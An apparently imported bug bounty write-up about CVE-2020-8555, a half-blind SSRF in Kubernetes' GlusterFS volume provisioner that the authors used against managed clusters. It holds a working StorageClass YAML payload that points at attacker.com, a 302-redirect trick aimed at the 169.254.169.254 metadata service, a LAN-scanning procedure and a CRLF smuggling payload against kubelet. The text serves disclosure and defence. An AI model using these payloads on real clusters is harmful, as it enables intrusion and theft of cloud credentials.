---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-06-02_when-its-not-only-about-a-kubernetes-cve.md
original_filename: 2020-06-02_when-its-not-only-about-a-kubernetes-cve.md
title: When it’s not only about a Kubernetes CVE…
category: documents
detected_topics:
- ssrf
- cloud-security
- supply-chain
- sso
- idor
- access-control
tags:
- imported
- documents
- ssrf
- cloud-security
- supply-chain
- sso
- idor
- access-control
language: en
raw_sha256: f5483a8d62f6e825229ee15a9fb2659ba547cd6135799bd25c100406f87d132d
text_sha256: 424a4835c6c3fbf0c4e2190971385fc9f413a4c185d965e8aa83c86696ce40ee
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# When it’s not only about a Kubernetes CVE…

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-06-02_when-its-not-only-about-a-kubernetes-cve.md
- Source Type: markdown
- Detected Topics: ssrf, cloud-security, supply-chain, sso, idor, access-control
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `f5483a8d62f6e825229ee15a9fb2659ba547cd6135799bd25c100406f87d132d`
- Text SHA256: `424a4835c6c3fbf0c4e2190971385fc9f413a4c185d965e8aa83c86696ce40ee`


## Content

---
title: "When it’s not only about a Kubernetes CVE…"
url: "https://medium.com/@BreizhZeroDayHunters/when-its-not-only-about-a-kubernetes-cve-8f6b448eafa8"
authors: ["Reever Zax (@ReeverZax)", "Hach (@__hach_)"]
programs: ["Microsoft"]
bugs: ["SSRF"]
bounty: "40,000"
publication_date: "2020-06-02"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4536
scraped_via: "browseros"
---

# When it’s not only about a Kubernetes CVE…

Breizh Zero-day Hunters
 highlighted

When it’s not only about a Kubernetes CVE…
Breizh Zero-day Hunters
Follow
10 min read
·
Jun 2, 2020

266

1

Who we are :

We are two French security researchers who worked and found a Kubernetes vulnerability together. Our names are Brice Augras and Christophe Hauquiert, but you might also know us as Reeverzax and Hach on many Bug Bounty platforms.

Brice Augras — https://hackerone.com/reeverzax — BZHunt
Christophe Hauquiert — https://hackerone.com/hach — Sekost

What happened ?

This testimony is our way to recount how a personal research project turned out to be the craziest experience we ever went through in our bounty hunters’ lifes (so far :p).

As you may know, hunters have two main characteristics :

pizza and beers are their basic needs
they work when people are asleep

We are no exception to these rules : we generally meet on week-end for sleepless hacking nights. But one of them turned out to be a bit different from usual.

Initially, we were supposed to meet because we were participating to a CTF on the following day.

While we were speaking about Kubernetes security subject in a managed service environment, we decided to bring up an old SSRF idea that could be used as an attack scenario.
This is how we started doing some investigation work @11p.m and went to bed quite early in the morning, more excited than tired obviously…

Thanks to this research, we came across the MSRC Bug Bounty program and performed an Elevation of Privilege exploit.

After a few weeks/months, this unexpected experience allowed us to receive one the highest Azure Cloud Bug Bounty reward — in addition to the one we received from Kubernetes !

Our research project led Kubernetes Product Security Committee to publish the following : CVE-2020–8555.

Our purpose is to get the word out : we genuinely hope that you guys will enjoy what we found and will share the technical details to the infosec community ! :)

Here is our story …

Context

In order to share our research project in an understandable way, let’s first define how Kubernetes works inside a cloud managed service environment.

When you create a managed Kubernetes cluster instance, the control plane is generally hosted and managed by the cloud provider.

Press enter or click to view image in full size
Control plane is hosted in the cloud provider perimeter, while Kubernetes nodes are in the client perimeter.

When it comes to dynamic volume provisioning, this mechanism is used to dynamically provision volumes from an external storage backend and map them to a persistent volume claim (PVC).

Therefore, when a persistent volume claim is created and associated with a StorageClass on a k8s cluster, the provisioning step is handled by the kube/cloud controller manager (its name depends on the release).

There are several volume provisioner supported by Kubernetes, most of them are included in Kubernetes core (https://kubernetes.io/docs/concepts/storage/storage-classes/#provisioner) but some others are managed by additional provisioners that must be instantiated as pods in the cluster.

For this research topic, we focused on the in-core provisioning mechanism presented underneath :

Press enter or click to view image in full size
Dynamic volume provisioning using Kubernetes in core provisioner

To sum up : when Kubernetes is deployed in a managed environment the controller manager is handled by the cloud provider but the request (3) for asking volume creation is emitted from the internal cloud provider network. This is where it becomes really interesting !

Compromission Scenario

In this chapter, we will explain how we abused the workflow mentioned above to access cloud provider internal resources and how it enabled us to perform several actions, such as dumping internal credentials/privilege escalation.

The root cause (in this case a Service Side Request Forgery) helped us escape our customer environment on multiple providers offering k8s managed service.

During our investigations we focused on the GlusterFS provisioner : we will only describe the vulnerability related to it, but Quobyte, StorageFS and ScaleIO are also concerned.

Press enter or click to view image in full size
Abusing dynamic volume provisioning

While we were conducting some analysis on glusterFS storage Class in the Golang client source, we noticed that on the first HTTP request (3) issued during a Volume creation
(https://github.com/heketi/heketi/blob/6a1ff1a6176e6566894d30ecc714d0643301558d/client/api/go-client/volume.go#L34), /volumes was appended at the end of the user provided URL in resturl parameter.

In order to remove the end of this unwanted path, we used the # trick in the resturl parameter.
Here is the first YAML payload we used as evidence for the half-blind SSRF vulnerability:

apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
  name: poc-ssrf
provisioner: kubernetes.io/glusterfs
parameters:
  resturl: "http://attacker.com:6666/#"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: poc-ssrf
spec:
  accessModes:
  - ReadWriteOnce
  volumeMode: Filesystem
  resources:
  requests:
  storage: 8Gi
  storageClassName: poc-ssrf

To remotely manage our Kubernetes cluster, we then used kubectl binary. Normaly, every cloud provider (Azure, Google, AWS, etc..) offers a way to download the credentials and configure this tool.

Thanks to this, we were able to execute our crafted payload. The kube controller manager handled the creation process and triggered the HTTP resulting request:

kubectl create -f sc-poc.yaml
Received request from attacker point of view

Shortly after that, we were also able to retrieve the HTTP response from the targeted server by using describe PVC or by getting events commands provided by kubectl. Indeed, this Kubernetes driver is by default too verbose about warnings/errors handling.

Here is an example by setting “https://www.google.fr” value as resturl parameter :

kubectl describe pvc poc-ssrf
# you can also use kubectl get events
Press enter or click to view image in full size

Following this first approach, we were limited to HTTP POST requests and thus unable to retrieve body content from the response if the return code was equal to 201.

Thereafter, we conducted deeper investigations and we improved this exploitation scenario with new approaches.

Research Evolution
Advanced scenario N°1 : Using 302 redirect from external server to change HTTP method and to obtain a more flexible way to retrieve internal data
Advanced scenario N°2 : Automating LAN scanning and discovering internal resources
Advanced scenario N°3 : Exploiting HTTP CRLF + Smuggling payload in order to craft fully customized HTTP requests and to retrieve data leak in Kube Controller logs
Technical Specifications
We led our research on Azure Kubernetes Service (AKS) with Kubernetes version 1.12 in North Europe region.
The 3 described advanced scenarios in this write-up were working on most recent Kubernetes releases except number 3 that required Kubernetes compiled with Golang ≤ 1.12
Attacker external server : https://attacker.com
Advanced Scenario N°1 : Redirecting POST to GET HTTP request trick and sensitive data exposure

We improved our first payload by setting the attacker server to return a 302 HTTP Retcode in order to convert POST request to GET request (Step 4 on the schematic).

Press enter or click to view image in full size

The first request (3) issued by GlusterFS client (Controller Manager) was a POST type, by completing the following steps, we were able to convert POST request to GET:

Storage class uses http://attacker.com/redirect.php as resturl parameter
https://attacker.com/redirect.php endpoint responds with a 302 HTTP return code with the following Location Header http://169.254.169.254 . It could be any other internal resource, this redirected url is used for example purposes.
Default Behaviour of Golang net/http library is to follow redirection and converts POST to GET with 302 return code, the targeted resource is then requested with a HTTP GET request.

The HTTP response body became readable by describing persistent volume claim object:

kubectl describe pvc xxx

Here is an example of JSON HTTP response we were able to retrieve :

Press enter or click to view image in full size

The exploitation process of our vulnerability at this moment was limited due to the following elements:

We were not able to inject HTTP headers in the emitted request
We were not able to perform POST HTTP Request with body parameters (useful to request key value on ETCD instance running on 2379 port if HTTP unencrypted is used)
We were not able to retrieve response body content when HTTP return code was 200 and not a JSON Content-Type response.
Advanced Scenario N°2 : Lan scanning

This half-blind SSRF was then used to scan cloud provider internal network and to request the different listening services (Metadata instance, Kubelet, ETCD, etc..) based on the kube controller responses.

Press enter or click to view image in full size

To do so, we first identified default listening ports of Kubernetes components (8443, 10250,10251, etc…) then we had to automate the scanning process.

Get Breizh Zero-day Hunters’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Seeing that the way to scan for one resource was very specific and incompatible with traditional SSRF exploitation tools or scanners, we decided to create some kind of custom workers in bash script that will automate the complete process.

For instance, in order to be able to scan for 172.16.0.0/12 internal LAN range faster, we launched simultaneously 15 workers. The above IP range was chosen just for demonstration purposes and can be adapted to each provider internal IP range.

As a prerequisite to scan one IP address and one port we had to achieve the following tasks:

Delete previous tested Storage Class
Delete previous tested Persistent Volume Claim
Change IP and PORT in sc.yaml
Create Storage Class with new IP and port
Create new Persistent Volume Claim
Retrieve scan result by describing Persistent Volume Claim
Advanced Scenario N°3 : CRLF + smuggling HTTP injection in “old” Kubernetes cluster releases

If, in addition to this, the provider offered to its customers old k8s clusters releases AND gave them kube controller manager logs access, the impact became even higher.

Indeed, an attacker could interact in a more convenient way by crafting full user-controllable HTTP requests intended to retrieve the complete HTTP response.

Press enter or click to view image in full size

The prerequisites for this last scenario were the following ones:

Kube Controller Manager logs reachable by the customer (e.g : Azure LogInsights)
Kubernetes Cluster version using Golang version <1.12

We deployed a local environment simulating Kubernetes exchanges between the GlusterFS Go client and a fake targeted server (We will not release the PoC for the moment).

We noticed that a vulnerability existed for the following Golang releases <1.12 (https://github.com/golang/go/issues/30794) and allowed attackers to perform HTTP smuggling/CRLF attacks.
By combining the Half-Blind SSRF vulnerability described above WITH this new one, we were able to send complete crafted requests, including custom headers, HTTP method, parameters and data that were then treated by the kube controller manager.

Here is an example of a working StorageClass resturl parameter payload that allows to perform this kind of attack scenario :

http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-
alive\r\nHost: 172.31.X.1:10255\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: 172.31.X.1:10255\r\n\r\n

An “unsolicited response” error was then triggered and stored inside controller logs. Thanks to default verbosity, the content of the HTTP Response Message was logged too.

Press enter or click to view image in full size

This was our most impactful proof of concept payload.

With this last approach, we managed to perform some of the following actions among different managed k8s providers: Priv esc with credential retrieving on metadata instances, DoS the master instance with HTTP request (unencrypted) on ETCD master instances, etc…

Impact

When we take a look at the official Kubernetes announcement regarding the SSRF vulnerability, we can notice the following CVSS 6.3/10 Rating: CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N

When we only consider the vulnerability linked to Kubernetes appliance perimeter, Integrity vector is qualified as None.

However (and this was the most interesting part of this research project) evaluating the impact in a managed service context environment led us to requalify the vulnerability with a Critical CVSS10/10 rating for multiple distributors.

Here is more data to help you understand how we were able to justify the impact metrics inside a cloud provider environment:

Integrity
Remote command execution by using the internal dumped credentials
Reproducing above scenario in an IDOR way with other resources discovered in LAN area.
Confidentiality
Lateral movement from cloud credentials stealing (e.g: metadata API)
Information gathering by LAN scanning (ssh version, http server versions, …)
Instances and infrastructure information by requesting internal API like metadata APIs (http://169.254.169.254, …)
Customers data leak, by using cloud credentials
Availability

All the post-exploitation scenarios about integrity attack vectors could be used to perform disruptive scenarios and make master instances from our customer perimeter or other customer unavailable.

As we were in managed K8S environment and considering the integrity impact, we can imagine lots of scenarios that can impact availability. An additional example could be to corrupt ETCD database or perform critical call to kubernetes API.

Timeline
6th December 2019 : MSRC Bug Bounty case submission
3rd January 2020 : Kubernetes has been informed by a third-party actor that we were working on the security issue. They requested them to consider the SSRF as being an in-core vulnerability. We then provided a generic report with technical details about the root cause.
15th January 2020 : Upon Kubernetes Team’s request, we provided them with a technical and generic report submission to Kubernetes through HackerOne platform.
15th January 2020 : Kubernetes noticed us that the half blind SSRF part + CRLF injection for old releases was being considered as an in-core vulnerability. We immediately stopped looking in other distributors perimeter as the root cause was now handled by K8s team.
15th January 2020 : Bounty Received from MSRC through HackerOne
16th January 2020 : Kubernetes PSC (Product Security Committee) acknowledged the vulnerability and requested us the mid-march embargo due to the numerous distributors involved on this security matter.
11th February 2020 : Bounty received from Google VRP
4th March 2020 : Bounty received from Kubernetes through HackerOne
15th March 2020 : Initial planned public disclosure delayed due to COVID-19 situation
1st June 2020 : Kubernetes + Microsoft Public Disclosure
TL;DR
We were eating pizzas and drinking beers :)
We found an in-core Kubernetes vulnerability inside Kubernetes and it was not part of the original plan for our winter evening.
We conducted additional analysis inside some cloud provider companies that enabled us to increase the impact of the vulnerability and to get additional crazy bounties :)
You will find many technical details throughout this article. We would love to discuss them with you (Twitter : @ReeverZax & @__hach_ )
We learned that the managing and reporting part is more time consuming than we expected :)
References
https://groups.google.com/g/kubernetes-security-announce
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8555
https://github.com/golang/go/issues/30794
https://github.com/heketi/heketi/blob/6a1ff1a6176e6566894d30ecc714d0643301558d/client/api/go-client/volume.go#L34
